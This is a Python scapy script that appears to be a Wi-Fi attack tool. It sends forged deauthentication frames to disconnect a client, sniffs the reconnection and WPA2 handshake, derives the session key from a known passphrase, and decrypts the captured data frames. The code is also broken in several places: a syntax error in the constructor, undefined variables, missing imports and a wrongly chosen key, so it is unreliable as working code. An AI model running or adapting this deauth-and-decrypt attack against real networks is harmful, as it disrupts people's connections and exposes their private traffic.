from scapy.all import *

    
class Capturemodule:
    
    def __init__(self, APmac, STAmac, ,ssid, pw, interface):
        self.APmac = APmac
        self.STAmac = STAmac
        self.ssid = ssid
        self.pw = pw
        self.interface = interface
        self.encryption = ""
        self.status = 0
        """
        Bits 1 authentication request
        Bits 2 authentication response
        Bits 4 association request
        Bits 8 association response
        Bits 16 key_ex1_done
        Bits 32 key_ex2_done
        Bits 64 key_ex3_done
        Bits 128 key_ex4_done
        """
    
    def deauth(self):
        dot11 = Dot11(addr1= self.STAmac, addr2= self.APmac, addr3= self.APmac)
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        sendp(packet, count=1, iface= self.interface, verbose=1)
        
    def packet_sniff(self):
        sniff(iface=self.interface, prn=self.mac_filter, filter=f'ether host {self.APmac} or ether host {self.STAmac}')

    def mac_filter(self, pkt):
        dot11header = pkt.getlayer(Dot11)
        pool = set()
        pool.add(pkt.addr1)
        pool.add(pkt.addr2)
        pool.add(pkt.addr3)
        # print("  [-] Debug : mac_filter", self.APmac in pool, self.STAmac in pool)

        if self.APmac in pool and self.STAmac in pool:
            self.sort_packet(pkt)

    def sort_packet(self, pkt):
        dot11header = pkt.getlayer(Dot11)
        if dot11header.type == 0:  # type : Management(0)
            if dot11header.subtype == 11:  # subtype : Authentication(11)
                self.authentication(pkt)
            if dot11header.subtype == 0:  # subtype : Association Request(0)
                self.association_request(pkt)
            elif dot11header.subtype == 1:  # subtype : Association Response(1)
                self.association_response(pkt)
        elif dot11header.type == 2:
            if int(dot11header.FCfield) & 64 == 0:  # flag Protected not set : EAPOL key change
                self.eapol_keychange(pkt)
            else:  # flag Protected set : Data Packet(encrypted)
                self.collect_data(pkt)

    def authentication(self, pkt):
        auth = pkt.getlayer(Dot11Auth)
        if auth.algo == 0:
            if auth.seqnum == 1 and auth.status == 0:  # Authentication Request
                self.status |= 1
                print(" [*] Authentication Request")
            elif auth.seqnum == 2 and auth.status == 0:  # Authentication Response
                self.status |= 2
                print(" [*] Authentication Response")

    def association_request(self, pkt):
        if self.status & 3 != 3:  # Flag not set
            print(" [-] Packet Order Wrong... at association_request")
            raise Exception
        if pkt.haslayer(Dot11EltRSN):
            self.encryption = "WPA2"
            print(" [*] Association Request : WPA2")
        elif pkt.haslayer(Dot11EltMicrosoftWPA):
            self.encryption = "WPA"
            print(" [*] Association Request : WPA")
        else:
            self.encryption = "OPEN"
            print(" [*] Association Request : OPEN")
        self.status |= 4

    def association_response(self, pkt):
        if self.status & 7 != 7:  # Flag not set
            print(" [-] Packet Order Wrong... at association_response")
            raise Exception
        if pkt.getlayer(Dot11AssoResp).status == 0:  # status 0 : success
            self.status |= 8
            print(" [*] Association Response")

    def eapol_keychange(self, pkt):
        print(" [*] EAPOL key change")

        p = getptk()
        p.getnonce(pkt)
        
        anonce = p.F_nonces[0]
        snonce = p.F_nonces[1]
        
        ap_mac = binascii.a2b_hex(self.APmac.replace(":", ""))
        sta_mac = binascii.a2b_hex(self.STAmac.replace(":", ""))

        A, B = p.MakeAB(anonce, snonce, ap_mac, s_mac)
        pmk = p.makePMK(pw, ssid)
        p.ptk = p.makePTK(pmk, A, B)
        pass

    def collect_data(self, pkt):
        print(" [*] Collecting data")
        d = WPA2DecryptionBox(pkt, p.ptk)
        d.save_packet()
        
        pass


class getptk():
    F_nonces = []
    ptk = b''

    def getnonce(self, pkt):
        eapol = pkt.getlayer(EAPOL)
        self.F_nonces.append(bytes(eapol)[0x11:0x11 + 0x20])

    def PRF(self, key, A, B):
        # Number of bytes in the PTK
        nByte = 64
        i = 0
        R = b''
        # Each iteration produces 160-bit value and 512 bits are required
        while (i <= ((nByte * 8 + 159) / 160)):
            hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), sha1)
            R = R + hmacsha1.digest()
            i += 1
        return R[0:nByte]

    def MakeAB(self, aNonce, sNonce, apMac, cliMac):
        A = b"Pairwise key expansion"
        B = min(apMac, cliMac) + max(apMac, cliMac) + min(aNonce, sNonce) + max(aNonce, sNonce)
        return (A, B)

    def makePMK(self, pwd, ssid):
        pmk = pbkdf2_hmac('sha1', pwd.encode('ascii'), ssid.encode('ascii'), 4096, 32)
        return pmk

    def makePTK(self, pmk, A, B):
        ptk = self.PRF(pmk, A, B)
        return ptk


class WPA2DecryptionBox:
    def __init__(self, pkt, tk_key):
        self.pkt = pkt
        self.tk_key = tk_key
        self.TA = binascii.a2b_hex(self.pkt.getlayer(Dot11).addr2.replace(':', ''))
        self.PN = self.make_PN()

    def make_PN(self):
        CCMP_header = bytes(self.pkt.getlayer(Dot11CCMP))
        PN = (CCMP_header[0:2] + CCMP_header[4:8])[::-1]
        # print(b'debug : ' + PN)
        return PN

    def make_CTR_PRELOAD(self, idx):
        Flag = b'\x01'
        Qos_TC = b'\x00'
        TA = self.TA
        PN = self.PN
        counter = struct.pack('>h', idx + 1)
        return Flag + Qos_TC + TA + PN + counter

    def decrypt_AES_CTR(self):
        plaintext = b''
        ciphertext = bytes(self.pkt.getlayer(Dot11Encrypted))
        ciphertext = ciphertext[:-8]  # exclude MIC
        ciphertext += b'\x00' * (len(ciphertext) % 16)
        block_len = len(ciphertext) // 16

        cipher = AES.new(self.tk_key, AES.MODE_ECB)
        for idx in range(block_len):
            xordata = cipher.encrypt(self.make_CTR_PRELOAD(idx))
            for i, j in zip(xordata, ciphertext[16 * idx: 16 * (idx + 1)]):
                plaintext += bytes([i ^ j])

        return plaintext

    def save_packet(self):
        try:
            plaintext = self.decrypt_AES_CTR()
        except Exception as e:
            print(" [*] Error : ", e)

        print("result : ", plaintext)
        with open('result.pcap', 'wb') as f:
            f.write(plaintext)
        print("[+] Save Packet Done!")


'''if __name__ == '__main__':
    # Just For test.... Packet capture is too hard...
    sample = PcapReader("/home/hunjison/Desktop/CRGWiFi/wpa-Induction.pcap")  # Pcap From Wireshark
    pkt_list = sample.read_all()
    capturemodule = Capture('00:0d:93:82:36:3a', '00:0c:41:82:b2:55', 'iptime')
    for pkt in pkt_list:
        capturemodule.mac_filter(pkt)'''